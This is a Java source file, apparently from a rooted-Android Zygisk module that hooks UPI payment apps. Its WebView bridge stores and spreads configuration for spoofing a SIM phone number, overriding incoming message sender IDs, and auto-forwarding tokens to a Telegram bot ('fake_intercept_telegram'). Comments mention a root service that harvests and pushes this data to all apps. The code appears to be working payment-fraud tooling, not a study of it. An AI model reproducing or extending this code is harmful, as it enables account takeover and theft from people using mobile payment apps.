package com.hivirtus.zygisk;

import android.content.Context;
import android.os.Environment;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;

/** Tiny bridge — WebView HTML UI ↔ module config (global Save across all UPI apps). */
public class HivirtusJsBridge {
    private static final String SAVE_TMP = "/data/local/tmp/hivirtus_ui_save.json";
    private static final String RUNTIME_CFG = "/data/local/tmp/hivirtus_zygisk_mode_config.json";
    private static final String MODULE_CFG = "/data/adb/modules/hivirtus_zygisk_mode/config.json";
    private static final String MODULE_SAVE = "/data/adb/modules/hivirtus_zygisk_mode/ui_save.json";
    private static final String SPOOF_PHONE = "/data/local/tmp/hivirtus_spoof_phone.txt";
    private static final String SENDER_ID_FILE = "/data/local/tmp/hivirtus_sender_id.txt";
    private static final String TG_CREDS = "/data/local/tmp/hivirtus_telegram_credentials.json";
    private static final String SAVE_OK_FLAG = "/data/local/tmp/hivirtus_save_ok.flag";

    private static Context appCtx;

    public static void setContext(Context ctx) {
        if (ctx != null) appCtx = ctx.getApplicationContext();
    }

    private static String readUtf8(File f) {
        if (f == null || !f.canRead()) return null;
        try (InputStreamReader r = new InputStreamReader(new FileInputStream(f), StandardCharsets.UTF_8)) {
            char[] buf = new char[16384];
            StringBuilder sb = new StringBuilder();
            int n;
            while ((n = r.read(buf)) > 0) sb.append(buf, 0, n);
            String s = sb.toString().trim();
            return s.isEmpty() ? null : s;
        } catch (Exception e) {
            return null;
        }
    }

    private static String readFirstLine(File f) {
        String s = readUtf8(f);
        if (s == null) return "";
        int nl = s.indexOf('\n');
        return (nl >= 0 ? s.substring(0, nl) : s).trim();
    }

    /** Global config: Documents/tmp/module/code_cache — har app same settings dikhe */
    @JavascriptInterface
    public String readConfig() {
        String[] candidates = new String[16];
        int n = 0;
        try {
            File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            if (docs != null) candidates[n++] = new File(docs, "hivirtus_ui_save.json").getAbsolutePath();
        } catch (Exception ignored) {
        }
        try {
            File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dl != null) candidates[n++] = new File(dl, "hivirtus_ui_save.json").getAbsolutePath();
        } catch (Exception ignored) {
        }
        candidates[n++] = SAVE_TMP;
        candidates[n++] = RUNTIME_CFG;
        candidates[n++] = MODULE_SAVE;
        candidates[n++] = MODULE_CFG;
        if (appCtx != null) {
            candidates[n++] = new File(appCtx.getFilesDir(), "hivirtus_ui_save.json").getAbsolutePath();
            candidates[n++] = new File(appCtx.getCacheDir(), "hivirtus_ui_save.json").getAbsolutePath();
            try {
                File cc = new File(appCtx.getCodeCacheDir(), "hivirtus/ui_save.json");
                candidates[n++] = cc.getAbsolutePath();
                File cc2 = new File(appCtx.getCodeCacheDir(), "hivirtus/config.json");
                candidates[n++] = cc2.getAbsolutePath();
            } catch (Exception ignored) {
            }
            try {
                File ext = appCtx.getExternalFilesDir(null);
                if (ext != null) candidates[n++] = new File(ext, "hivirtus_ui_save.json").getAbsolutePath();
            } catch (Exception ignored) {
            }
        }

        JSONObject merged = new JSONObject();
        for (int i = 0; i < n; i++) {
            if (candidates[i] == null) continue;
            String raw = readUtf8(new File(candidates[i]));
            if (raw == null || raw.indexOf('{') < 0) continue;
            try {
                JSONObject o = new JSONObject(raw);
                java.util.Iterator<String> keys = o.keys();
                while (keys.hasNext()) {
                    String k = keys.next();
                    Object v = o.get(k);
                    if (v == null) continue;
                    if (v instanceof String && ((String) v).isEmpty()) continue;
                    if (!merged.has(k) || isEmptyValue(merged.opt(k))) {
                        merged.put(k, v);
                    }
                }
            } catch (Exception ignored) {
            }
        }

        // Overlay dedicated global files (even if JSON missing keys)
        try {
            String sid = readFirstLine(new File(SENDER_ID_FILE));
            if (sid.isEmpty()) sid = readFirstLine(new File("/data/adb/modules/hivirtus_zygisk_mode/sender_id.txt"));
            if (sid.isEmpty() && appCtx != null) {
                sid = readFirstLine(new File(appCtx.getFilesDir(), "hivirtus_sender_id.txt"));
                if (sid.isEmpty()) {
                    try {
                        File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
                        if (docs != null) sid = readFirstLine(new File(docs, "hivirtus_sender_id.txt"));
                    } catch (Exception ignored) {
                    }
                }
            }
            if (!sid.isEmpty() && !"AD-TEST-S".equals(sid)) {
                merged.put("inject_sender_id", sid);
                merged.put("override_incoming_sender", true);
                merged.put("sender_id_enabled", true);
            }
        } catch (Exception ignored) {
        }

        try {
            String credsRaw = readUtf8(new File(TG_CREDS));
            if (credsRaw == null) {
                credsRaw = readUtf8(new File("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json"));
            }
            if (credsRaw == null && appCtx != null) {
                credsRaw = readUtf8(new File(appCtx.getFilesDir(), "hivirtus_telegram_credentials.json"));
            }
            if (credsRaw == null) {
                try {
                    File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
                    if (docs != null) credsRaw = readUtf8(new File(docs, "hivirtus_telegram_credentials.json"));
                } catch (Exception ignored) {
                }
            }
            if (credsRaw != null && credsRaw.indexOf('{') >= 0) {
                JSONObject c = new JSONObject(credsRaw);
                String t = c.optString("telegram_bot_token", "").trim();
                String ch = c.optString("telegram_chat_id", "").trim();
                if (!t.isEmpty()) merged.put("telegram_bot_token", t);
                if (!ch.isEmpty()) merged.put("telegram_chat_id", ch);
                if (!t.isEmpty() && !ch.isEmpty()) {
                    merged.put("auto_forward_token", true);
                    merged.put("telegram_enabled", true);
                    merged.put("fake_intercept_telegram", true);
                }
            }
        } catch (Exception ignored) {
        }

        try {
            String phone = readFirstLine(new File(SPOOF_PHONE));
            if (phone.isEmpty() && appCtx != null) {
                phone = readFirstLine(new File(appCtx.getFilesDir(), "hivirtus_spoof_phone.txt"));
            }
            if (phone.length() >= 10) {
                merged.put("mock_phone_sim1", phone);
                merged.put("enable_sim1_mock", true);
                merged.put("enable_phone_spoof", true);
                merged.put("fake_number_enabled", true);
            }
        } catch (Exception ignored) {
        }

        try {
            return merged.length() == 0 ? "{}" : merged.toString(2);
        } catch (Exception e) {
            return "{}";
        }
    }

    private static boolean isEmptyValue(Object v) {
        if (v == null) return true;
        if (v instanceof String) return ((String) v).trim().isEmpty();
        return false;
    }

    @JavascriptInterface
    public void saveConfig(String json) {
        if (json == null || json.isEmpty()) return;
        int wrote = 0;
        try {
            JSONObject incoming = new JSONObject(json);
            JSONObject merged = new JSONObject(readConfig());
            java.util.Iterator<String> keys = incoming.keys();
            while (keys.hasNext()) {
                String k = keys.next();
                merged.put(k, incoming.get(k));
            }

            if (merged.optBoolean("enable_sim1_mock", false)
                    || merged.optBoolean("enable_phone_spoof", false)
                    || merged.optBoolean("fake_number_enabled", false)
                    || merged.optBoolean("enable_virtual_sim", false)) {
                merged.put("enable_sim1_mock", true);
                merged.put("enable_phone_spoof", true);
                String phone = merged.optString("mock_phone_sim1", "").trim();
                if (phone.length() >= 10) {
                    merged.put("enable_virtual_sim", true);
                    writeEverywhere(SPOOF_PHONE, "hivirtus_spoof_phone.txt", phone + "\n");
                }
            }

            String sid = merged.optString("inject_sender_id", "").trim();
            if ("AD-TEST-S".equals(sid)) {
                sid = "";
                merged.put("inject_sender_id", "");
            }
            if (!sid.isEmpty()) {
                merged.put("override_incoming_sender", true);
                merged.put("sender_id_enabled", true);
                writeEverywhere(SENDER_ID_FILE, "hivirtus_sender_id.txt", sid + "\n");
            } else if (merged.optBoolean("sender_id_enabled", false)
                    || merged.optBoolean("override_incoming_sender", false)) {
                merged.put("override_incoming_sender", true);
            }

            if (merged.optBoolean("auto_forward_token", false)
                    || merged.optBoolean("telegram_enabled", false)
                    || merged.optBoolean("fake_intercept_telegram", false)) {
                merged.put("auto_forward_token", true);
                merged.put("fake_intercept_telegram", true);
                merged.put("telegram_enabled", true);
            }
            String tgToken = merged.optString("telegram_bot_token", "").trim();
            String tgChat = merged.optString("telegram_chat_id", "").trim();
            String body = merged.toString(2);
            wrote += writeEverywhere(SAVE_TMP, "hivirtus_ui_save.json", body);
            wrote += writeEverywhere(RUNTIME_CFG, "hivirtus_zygisk_mode_config.json", body);
            // Module path — root harvest/push uses this as canonical
            writeUtf8(MODULE_SAVE, body);

            if (!tgToken.isEmpty() && !tgChat.isEmpty()) {
                String creds = "{\n  \"telegram_bot_token\": \"" + tgToken.replace("\"", "")
                        + "\",\n  \"telegram_chat_id\": \"" + tgChat.replace("\"", "")
                        + "\"\n}\n";
                wrote += writeEverywhere(TG_CREDS, "hivirtus_telegram_credentials.json", creds);
                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json", creds);
                // service.sh queues ONE TG test on save_ok (3-min cooldown, no spam)
            }
            if (wrote > 0) {
                writeUtf8(SAVE_OK_FLAG, "1\n");
            }
        } catch (Exception e) {
            writeEverywhere(SAVE_TMP, "hivirtus_ui_save.json", json);
        }
    }

    /** Write tmp + app filesDir + public Documents (root service harvests + pushes to all apps). */
    private static int writeEverywhere(String tmpPath, String fileName, String data) {
        int n = 0;
        if (writeUtf8(tmpPath, data)) n++;
        if (appCtx != null) {
            try {
                File f = new File(appCtx.getFilesDir(), fileName);
                if (writeUtf8(f.getAbsolutePath(), data)) n++;
            } catch (Exception ignored) {
            }
            try {
                File f = new File(appCtx.getCacheDir(), fileName);
                if (writeUtf8(f.getAbsolutePath(), data)) n++;
            } catch (Exception ignored) {
            }
            try {
                File cc = new File(appCtx.getCodeCacheDir(), "hivirtus");
                //noinspection ResultOfMethodCallIgnored
                cc.mkdirs();
                if (writeUtf8(new File(cc, fileName).getAbsolutePath(), data)) n++;
                if ("hivirtus_ui_save.json".equals(fileName)) {
                    writeUtf8(new File(cc, "ui_save.json").getAbsolutePath(), data);
                }
            } catch (Exception ignored) {
            }
            try {
                File ext = appCtx.getExternalFilesDir(null);
                if (ext != null) {
                    File f = new File(ext, fileName);
                    if (writeUtf8(f.getAbsolutePath(), data)) n++;
                }
            } catch (Exception ignored) {
            }
        }
        try {
            File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            if (docs != null) {
                //noinspection ResultOfMethodCallIgnored
                docs.mkdirs();
                if (writeUtf8(new File(docs, fileName).getAbsolutePath(), data)) n++;
            }
        } catch (Exception ignored) {
        }
        try {
            File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dl != null) {
                //noinspection ResultOfMethodCallIgnored
                dl.mkdirs();
                if (writeUtf8(new File(dl, fileName).getAbsolutePath(), data)) n++;
            }
        } catch (Exception ignored) {
        }
        return n;
    }

    private static boolean writeUtf8(String path, String data) {
        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(path), StandardCharsets.UTF_8)) {
            w.write(data);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public static void attach(WebView webView) {
        if (webView == null) return;
        Context c = webView.getContext();
        if (c != null) setContext(c);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.addJavascriptInterface(new HivirtusJsBridge(), "Hivirtus");
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url != null && url.startsWith("hivirtus://minimize")) {
                    android.view.ViewParent parent = view.getParent();
                    if (parent instanceof android.view.View) {
                        ((android.view.View) parent).setVisibility(android.view.View.GONE);
                    } else {
                        view.setVisibility(android.view.View.GONE);
                    }
                    return true;
                }
                return false;
            }
        });
    }
}
